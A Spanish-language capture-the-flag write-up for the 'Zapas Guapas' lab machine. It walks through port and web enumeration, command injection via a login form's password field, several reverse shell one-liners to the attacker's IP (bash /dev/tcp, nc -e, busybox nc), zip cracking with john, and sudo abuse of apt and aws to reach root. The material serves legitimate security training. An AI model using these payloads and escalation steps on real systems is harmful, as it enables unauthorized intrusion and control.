
# Writeup Template: Maquina `[ Zapas Guapas ]`

- Tags: #ZapasGuapas
- Dificultad: `[ Facil ]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
192.168.100.35
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.35
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.35
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.35 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.35 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 192.168.100.35 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((DebianMantic))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.35
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.35
http://192.168.100.35 [200 OK] Apache[2.4.57], Bootstrap, Country[RESERVED][ZZ], Email[info@zapasguapas.thl], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.100.35], JQuery[3.0.0], Script, Title[Zapasguapas], X-UA-Compatible[IE=edge]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://192.168.100.35 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/contact.html         (Status: 200) [Size: 7694]
/about.html           (Status: 200) [Size: 8764]
/login.html           (Status: 200) [Size: 2090]
/images               (Status: 301) [Size: 317] [--> http://192.168.100.35/images/]
/index.html           (Status: 200) [Size: 14085]
/bin                  (Status: 301) [Size: 314] [--> http://192.168.100.35/bin/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.100.35/css/]
/lib                  (Status: 301) [Size: 314] [--> http://192.168.100.35/lib/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.100.35/js/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.100.35/javascript/]
/include              (Status: 301) [Size: 318] [--> http://192.168.100.35/include/]
/testimonial.html     (Status: 200) [Size: 8587]
/nike.php             (Status: 200) [Size: 2362]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos esta ruta de un formulario de inicio de sesion
```bash
http://192.168.100.35/login.html
```

Donde si probamos contrasenas tipicas, no reporta nada
```bash
admin: amdin
root: root
administrator: administrator
```

Si revisamos el codigo fuente del login vemos lo siguiente:
```js
<script>
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Evitar que el formulario se envíe de forma predeterminada

    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Ejecutar el comando proporcionado como contraseña
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            document.getElementById("result").innerHTML = xhr.responseText; // Mostrar el resultado en el div result
        }
    };
    xhr.open("GET", "run_command.php?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password), true);
    xhr.send();
    
    // Limpiar los campos después de mostrar el mensaje de alerta
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
});
</script>
```
### Ejecucion del Ataque
Detectamos que no realiza niguna validacion, respecto a inyeccion de comandos, por lo cual podemos aprovecharnos de esto para en el campo de password, ejecutar comandos:
```bash
# Comandos para explotación
username: admin
password: whoami
```

Ahora vemos que en la respuesta:
```bash
www-data
```
### Intrusion
Tenemos ejecucion remota de comandos,Ahora nos ponemos en modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
password: bash -c 'exec bash -i %26>/dev/tcp/192.168.100.24/443 <%261'
```

Si nos da la conexion, pero se ciera luego luego:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.24] from (UNKNOWN) [192.168.100.35] 59958
```

Ahora desde [revershell](https://www.revshells.com/) tendremos que probar con cual podemos ganar acceso:
```bash
nc 192.168.100.24 443 -e sh # NO funciona
sh -i >& /dev/tcp/192.168.100.24/443 0>&1 # NO funciono
```

Con esta si que ganamos acceso:
```bash
busybox nc 192.168.100.24 443 -e sh
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion de usuarios del sistema
cat /etc/passwd | grep "sh"
root:x:0:0:root:/root:/bin/bash
test:x:1000:1000:test,,,:/home/test:/bin/bash
proadidas:x:1001:1001::/home/proadidas:/bin/bash
pronike:x:1002:1002::/home/pronike:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Si enumeramos los directorios de los usuarios vemos que podemos atravesar sus directorios:
```bash
ls -l /home

drwxr-xr-x  3 proadidas proadidas 4096 Apr 23  2024 proadidas
drwxr-xr-x  3 pronike   pronike   4096 Apr 23  2024 pronike
```

Revisando en el directorio del usuario **pronike**
```bash
-rw-r--r-- 1 pronike pronike   58 Apr 23  2024 nota.txt
```

Tenemos el siguiente contendio:
```bash
cat nota.txt 
Creo que proadidas esta detras del robo de mi contraseña
```

Si revisamos la ruta: **( /opt )**
```bash
-rw-r--r--  1 proadidas proadidas  266 Apr 23  2024 importante.zip
```

Asi mismo verificamos si existe el binario de **python** para transferirnos este archivo:
```bash
www-data@zapasguapas:/opt$ which python3
/usr/bin/python3
```

Ahora desde la maquina victima nos montamos un servidor para dejar disponible ese comprimido
```bash
www-data@zapasguapas:/opt$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ..
```

Ahora desde nuestar maquina atacante realizamos la peticion para descargarnos ese archivo:
```bash
wget http://192.168.100.35:8080/importante.zip
--2025-08-09 23:23:11--  http://192.168.100.35:8080/importante.zip
Connecting to 192.168.100.35:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 266 [application/zip]
Saving to: ‘importante.zip’

importante.zip  100%[================================>]     266  --.-KB/s    in 0.006s  

2025-08-09 23:23:11 (40.1 KB/s) - ‘importante.zip’ saved [266/266]
```

Ahora que tenemos ese archivo, verificamos si no cuenta con contrasena, si es que tiene tendremos que realizar un ataque de fuerza bruta con **JohnTheReaper**
Verificamos que necesitamos realizar fuerza bruta sobre ese archivo:
```bash
7z x importante.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 266 bytes (1 KiB)

Extracting archive: importante.zip
--
Path = importante.zip
Type = zip
Physical Size = 266

Enter password (will not be echoed):
ERROR: Wrong password : password.txt
Sub items Errors: 1
Archives with Errors: 1
Sub items Errors: 1
```

Convertimos en **hash**
```bash
zip2john importante.zip > hash
ver 2.0 efh 5455 efh 7875 importante.zip/password.txt PKZIP Encr: TS_chk, cmplen=76, decmplen=71, crc=9CB8F6B5 ts=4C4E cs=4c4e type=8
```

Ahora realizamo el ataque de fuerza bruta;
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hotstuff         (importante.zip/password.txt)
```

Ahora descomprimimos el archivo:
```bash
 7z x importante.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 266 bytes (1 KiB)

Extracting archive: importante.zip
--
Path = importante.zip
Type = zip
Physical Size = 266

Would you like to replace the existing file:
  Path:     ./password.txt
  Size:     0 bytes
  Modified: 2024-04-23 07:34:28
with the file from archive:
  Path:     password.txt
  Size:     71 bytes (1 KiB)
  Modified: 2024-04-23 07:34:28
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y
                   
Enter password (will not be echoed): hotstuff 
Everything is Ok
Size:       71
Compressed: 266
```

Ahora tenemos un archivo: **password.txt** si revisamos su contendio:
```bash
File: password.txt
──────────────────────────────────────────────────────────
He conseguido la contraseña de pronike. Adidas FOREVER!!!!

pronike11
```

Ganamos acceso como este usuario:
```bash
ww-data@zapasguapas:/opt$ su pronike
Password: pronike11
pronike@zapasguapas:/opt$ 
```

###### Usuario `[ pronike ]`:
Listando los permisos de este usuario:
```bash
sudo -l

User pronike may run the following commands on zapasguapas:
    (proadidas) NOPASSWD: /usr/bin/apt
```

Ejecutamos el binaro
```bash
sudo -u proadidas /usr/bin/apt changelog apt
Des:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB]
Descargados 505 kB en 2s (284 kB/s)

# Despues ejecutamos este:
!/bin/bash
```

###### Usuario `[ Proadidas ]`:
Tenemos la flag de usuario pero no pedemos verla ya que no nos pertenece el archivo:
```bash
-r-------- 1 root      root        33 abr 17  2024 user.txt
```

Listamos los permisos de este usuario
```bash
sudo -l

User proadidas may run the following commands on zapasguapas:
    (proadidas) NOPASSWD: /usr/bin/apt
    (root) NOPASSWD: /usr/bin/aws
```

Ahora nos aprovechamos de esto para ganar acceso como **root**
```bash
# Comando para escalar al usuario: ( root )
proadidas@zapasguapas:~$ sudo -u root /usr/bin/aws help

# Despues ejecutamos este:
!/bin/bash
```

---

## Evidencia de Compromiso
Ahora si que podemos ver la flag de usuario y la flag de root:
```bash
ls -la /root

-r--------  1 root root   33 abr 17  2024 root.txt
```

```bash
# Captura de pantalla o output final
root@zapasguapas:/home/proadidas# echo -e "\n[+] Pwned: $(whoami)\n"

[+] Pwned: root
```
